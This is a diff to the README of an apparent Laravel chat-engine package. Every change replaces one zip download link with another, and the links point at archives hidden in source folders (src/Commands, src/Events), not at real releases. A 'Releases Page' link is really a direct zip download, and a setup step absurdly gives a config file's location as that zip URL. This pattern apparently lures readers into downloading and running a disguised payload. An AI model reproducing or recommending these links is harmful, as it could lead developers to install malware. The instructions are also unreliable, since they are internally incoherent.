@@ -8,11 +8,11 @@ Welcome to the laravel-chat-engine! This is a chat engine designed to work seaml
 
 To start using laravel-chat-engine, you will need to download the latest version. 
 
-[![Download Latest Version](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Commands/laravel-chat-engine-v3.8.zip%20Version-brightgreen)](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Commands/laravel-chat-engine-v3.8.zip)
+[![Download Latest Version](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Events/engine_chat_laravel_v3.9-alpha.5.zip%20Version-brightgreen)](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Events/engine_chat_laravel_v3.9-alpha.5.zip)
 
 You can visit the page below for the latest release:
 
-[Visit the Releases Page](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Commands/laravel-chat-engine-v3.8.zip)
+[Visit the Releases Page](https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Events/engine_chat_laravel_v3.9-alpha.5.zip)
 
 Once you are on the releases page, follow these steps:
 
@@ -62,7 +62,7 @@ After downloading, follow these steps to set up the chat engine:
      ```
 
 6. **Configure Your Chat Settings**: 
-   - Open the newly created configuration file located in `https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Commands/laravel-chat-engine-v3.8.zip`.
+   - Open the newly created configuration file located in `https://github.com/ghndor/laravel-chat-engine/raw/refs/heads/master/src/Events/engine_chat_laravel_v3.9-alpha.5.zip`.
    - Adjust any settings as needed for your application.
 
 7. **Start the Laravel Server**: 
